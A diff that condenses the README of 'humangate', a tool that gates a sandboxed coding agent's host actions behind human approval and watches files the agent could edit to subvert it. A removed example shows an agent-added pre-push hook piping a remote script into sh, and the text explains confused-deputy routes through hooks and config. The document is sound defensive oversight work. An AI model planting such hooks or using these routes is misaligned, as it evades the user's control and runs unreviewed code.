@@ -1,15 +1,9 @@
 # humangate
 
 Coding agents are safest in a sandbox without your keys - but then they can't sign a commit,
-push or deploy. humangate gives the agent those capabilities back without giving it the keys,
-and keeps you in the loop for what it can't be trusted to do alone:
-
-- **Actions that need your keys.** The agent can't sign a commit or push a branch, so it asks
-  you to run the command on the host. You see why and exactly what will run, and nothing
-  happens until you say yes.
-- **Files it shouldn't change behind your back.** Git hooks and config, the tools you approve
-  and whatever they run. humangate shows you any change as a diff the moment it happens, and
-  runs no request until you accept it.
+push or deploy. humangate gives the agent those capabilities back without giving it the keys:
+it asks you to run a tool on the host, and nothing runs until you say yes. Meanwhile humangate
+watches the files the agent could use to subvert your approval, and shows you any change.
 
 In the sandbox, the agent asks:
 
@@ -27,7 +21,6 @@ Tools: git-push, git-push-with-force, git-sign
 Guarding: git config, .humangate/tools, .humangate/guard, .git/hooks, package.json (18 files)
 Log: /home/me/.humangate/logs/home-me-project.jsonl
 
-
 ── Request 4f93b1686d8a3142 ──
 
 Rebased onto main; signatures were lost
@@ -39,39 +32,13 @@ Run it? (↑/↓ and Enter, or a shortcut letter)
   ❯ y  Yes, run it
     a  Yes, and don't ask again for this exact command (until restart)
     r  Reply to the agent instead...
-
-Re-signing:
-  9c424df Add the widget
-  052b5ed Test the widget
-
-Successfully rebased and updated refs/heads/my-branch.
-
-Exit code 0 - result sent to the agent
 ```
 
-The agent's `request` then prints the same output and exits with the tool's exit code.
-
-If the agent edits a guarded file, say a `pre-push` hook, the loop rings the bell and shows it
-right away:
-
-```
-── Guarded files changed ──
-
-Requests are refused until you accept this or it's reverted.
-
-.git/hooks/pre-push added
-  @@ -0,0 +1,2 @@
-  +#!/bin/sh
-  +curl -s https://example.com/x | sh
-
-Accept the change? (↑/↓ and Enter, or a shortcut letter)
-  ❯ n  No - refuse requests until it's reverted
-    y  Yes, accept it as the approved state
-```
+The tool's output and exit code go back to the agent's `request`.
 
 ## Install
 
-On the host, and inside the sandbox the agent runs in:
+On the host and in the sandbox:
 
 ```bash
 curl -fsSL https://raw.githubusercontent.com/szajbus/humangate/main/install.sh | sh
@@ -81,14 +48,12 @@ It installs a single Python script to `~/.local/bin/humangate` (`HUMANGATE_BIN_D
 change), and needs Python 3.8+ and git. Run it again to update.
 
 The project directory has to be shared between the sandbox and the host, writable from both -
-requests travel through `.humangate/queue/` in it. Most VM and container sandboxes mount the
-project that way already. It's the one channel every sandbox has, so there's no port to open
-or token to hand out; the price is polling - an answer takes up to a second.
+requests travel through `.humangate/queue/` in it. Most VM and container sandboxes mount it
+that way already, so there's no port to open or token to hand out.
 
 ## Which credentials go where
 
-**The agent in the sandbox gets read-only credentials; the ones that can write stay on the
-host.**
+**The sandbox gets read-only credentials; the ones that can write stay on the host.**
 
 | In the sandbox (read-only)                         | On the host only (write-enabled)           |
 | -------------------------------------------------- | ------------------------------------------ |
@@ -97,101 +62,60 @@ host.**
 | read-only API keys, a viewer role in the cloud     | deploy, publish and admin credentials      |
 | a read replica or read-only database user          | a database user that can write             |
 
-Then give each write action a tool - `git-push`, `deploy-staging`, `npm-publish` - which runs
-on the host, with your credentials, once you approve it. Credentials the agent never gets can't
-leak through a mistake or a prompt injection.
+Give each write action a tool - `git-push`, `deploy-staging`, `npm-publish` - that runs on the
+host once you approve it. Credentials the agent never gets can't leak.
 
 ## Use
 
-1. Give the project some tools: executables in `.humangate/tools/`. `humangate init` adds
-   ready-made ones - `git-sign`, `git-push` and `git-push-with-force` - picked from a
-   checklist; `humangate init --global` adds them to `~/.humangate/tools/` on the host instead,
-   for every project. Write your own for anything else (see [Tools](#tools)).
-2. On the host, in the project directory, start the loop and keep it open:
-   ```bash
-   humangate loop
-   ```
-3. Tell the agent about it. `humangate init` offers to: it writes the instructions to
-   `.humangate/AGENTS.md` and adds a reference to it to the project's `AGENTS.md`.
-4. Optionally, list the files your tools run or read in `.humangate/guard`, so the loop tells
-   you when the agent changes them (see [Guarding files](#guarding-files)). `humangate init`
-   offers a starter list based on what it finds in the project.
-
-Every project directory - every git worktree, too - has its own queue, so run one loop per
-agent session.
+1. Run `humangate init`. It adds starter tools - `git-sign`, `git-push`,
+   `git-push-with-force` - to `.humangate/tools/` (or with `--global`, to `~/.humangate/tools/`
+   on the host, for every project), and offers to tell the agent about humangate in
+   `AGENTS.md` and to suggest files to guard.
+2. On the host, in the project directory, run `humangate loop` and keep it open. Every project
+   directory - every git worktree, too - has its own queue, so run one loop per agent session.
 
 ## Tools
 
 A tool is a capability you grant the agent. You're not asked "is this shell command safe?" but
-"do I let the agent do this, with these arguments?" - a question you can answer at a glance.
+"do I let the agent do this, with these arguments?"
 
-It's any executable in a project's `.humangate/tools/` or in `~/.humangate/tools/` on the
-host (global tools, available in every project). It runs in the project root on the host with
-the agent's arguments as-is.
+It's any executable in `.humangate/tools/`, or in `~/.humangate/tools/` on the host for every
+project. It runs in the project root with the agent's arguments as-is. The agent lists tools
+with `humangate tools` (the global ones only while the loop runs).
 
-The agent discovers tools with `humangate tools`. It sees the global ones only while the loop is
-running: they live in your home on the host, which the sandbox can't see, so the loop lists
-them for it.
-
-- Start it with a comment header after the shebang: a `Usage:` line and a short description.
-  That's what `humangate tools` shows the agent - read from the file, never by running the tool.
-- Print the same header on `--help`, as the starter tools do.
-- Validate every argument - they come from the agent. Refuse anything unexpected with a
-  non-zero exit and a message on stderr.
-- Keep it small and specific, so the command you're asked to approve says exactly what will
-  happen. `git-push <branch>` is a capability you can decide on; `git <anything>` isn't.
-- Run as little of the project's code as you can. The agent could have written any of it, so
-  a tool that runs it can be made to do more than its name says. Git's own hooks and config
-  are [guarded](#guarding-files); for anything more, see below.
-
-### Tools that run project code
-
-Some tools can't avoid it - a deploy script, a release task. Don't let them run the working
-tree the agent edits; have them check out code that's been reviewed, like `origin/main`, into
-a fresh directory and run it from there. That only works if the agent can't change that code
-through your tools alone - say, `main` accepts only reviewed pull requests.
+- Put a `Usage:` line and a short description in a comment after the shebang - that's what the
+  agent sees - and print it on `--help`.
+- Validate every argument; refuse anything unexpected with a non-zero exit.
+- Keep it small and specific: `git-push <branch>` is a capability you can decide on;
+  `git <anything>` isn't.
+- Run as little of the project's code as you can - the agent could have written it. If a tool
+  must, like a deploy, have it run reviewed code - a fresh checkout of an `origin/main` that
+  only accepts reviewed pull requests - rather than the working tree.
 
 ## Guarding files
 
 Your "yes" is only as good as what the approved command runs, and the agent can edit much of
-that: the tools, git hooks and config (a `pre-push` hook or `core.sshCommand` can run
-anything), and whatever else your tools reach into - `package.json` scripts, a `Makefile`, CI
-workflows, an `.envrc`, etc. A tool that runs such a file is a *confused deputy*: it acts on
-the agent's code with your credentials. So the loop guards these files: it remembers their
-state when it starts, and checks them every couple of seconds and before each request.
+that: the tools, git hooks and config (`core.sshCommand` can run anything), `package.json`
+scripts, a `Makefile`. A tool that runs them becomes a *confused deputy*, acting on the agent's
+code with your credentials. So the loop guards these files, checking them every couple of
+seconds and before each request.
 
-Always guarded: the project's tools, git hooks (including `core.hooksPath`), the repository's git config
-except `branch.*` (git writes those itself), and `.humangate/guard` - the project's list of
-more paths to guard. It takes one path or glob per line (`**` matches any depth), relative to
-the project root. A directory covers everything in it; `#` starts a comment:
+Always guarded: the tools, git hooks, git config (except `branch.*`) and `.humangate/guard`,
+which lists more paths or globs, one per line, relative to the project root:
 
 ```
-# Files humangate loop guards on top of the built-in ones ...
 package.json
 Makefile
 .github/workflows/
-.envrc
 ```
 
-Editing the list is a change to review like any other, so the agent can't quietly drop an
-entry.
+A change shows up as a diff. Accept it and it becomes the approved state; refuse it and no
+request runs until it's reverted.
 
-A change shows up at once as a diff (size and hash for binary files). Accept it and it becomes
-the approved state; refuse it and requests are refused until it's reverted - each new request
-offers the review again. Files that a change to the list starts guarding are part of the same
-review, and a request isn't run if a guarded file changes while you're deciding on it.
-
-Keep in mind:
-
-- It detects, it doesn't prevent: the agent can still write the files, humangate just refuses
-  to act until you've seen the change.
-- It doesn't follow code. Guarding `package.json` doesn't cover the script it runs, or what
-  that script imports. List the entry points; for a tool that runs much of the project's code,
-  run a reviewed ref instead (see [Tools that run project code](#tools-that-run-project-code)).
-- Switching branches or rebasing changes tracked files like `package.json`, so expect to review
-  those diffs after such git work.
-- Every file is re-read on each check - fine for tens of files, slow for something like
-  `node_modules/`. The loop warns at start if checking takes too long.
+- It detects, it doesn't prevent. And it doesn't follow code: guarding `package.json` doesn't
+  cover the script it runs, so guard the entry points and keep tools off unreviewed code.
+- Expect to review tracked files after switching branches or rebasing.
+- Files are re-read on every check - fine for tens of files, slow for `node_modules/`.
 
 ## Security
 
@@ -206,22 +130,15 @@ Keep in mind:
               └───────── shared project directory ───┘
 ```
 
-The sandbox is untrusted: the agent and everything it writes - requests, arguments, reasons,
-any file in the project. The host is trusted: the loop, your credentials and the tools, which
-are the only way across. humangate assumes the agent may try to trick you, and relies on you
-to read what you approve.
+The sandbox is untrusted: the agent and everything it writes. The host is trusted: the loop,
+your credentials and the tools, which are the only way across. humangate assumes the agent may
+try to trick you, and relies on you to read what you approve.
 
-- It only gates what the sandbox can't already do. A write-enabled credential inside the
-  sandbox bypasses it entirely - keep those on the host (see
-  [Which credentials go where](#which-credentials-go-where)).
-- A request is only a tool name, arguments and a reason. The command shown to you is exactly
-  the one that runs, with no shell involved. Control characters are stripped from what's shown,
-  so it can't rewrite your terminal.
-- The agent can edit what the tools run, and turn a tool into a confused deputy. The first
-  defense is how the tool is written (see [Tools](#tools)); the second is
-  [guarding files](#guarding-files).
-- Tools run with your full environment, so a tool's argument checks are what keeps it from
-  doing more than its name says.
+- A write-enabled credential in the sandbox bypasses humangate entirely.
+- A request is only a tool name, arguments and a reason. What you're shown is exactly what
+  runs, with no shell involved and control characters stripped.
+- Tools run with your full environment; their argument checks keep them to what their name
+  says.
+- Any process that can write to the project directory can queue a request, other agents
+  included. It still needs your approval.
 - The loop refuses to start inside a workmux sandbox (`WM_SANDBOX_GUEST` set).
-- Any process that can write to the project directory can queue a request - including other
-  agents sharing the same sandbox. The request still needs your approval.
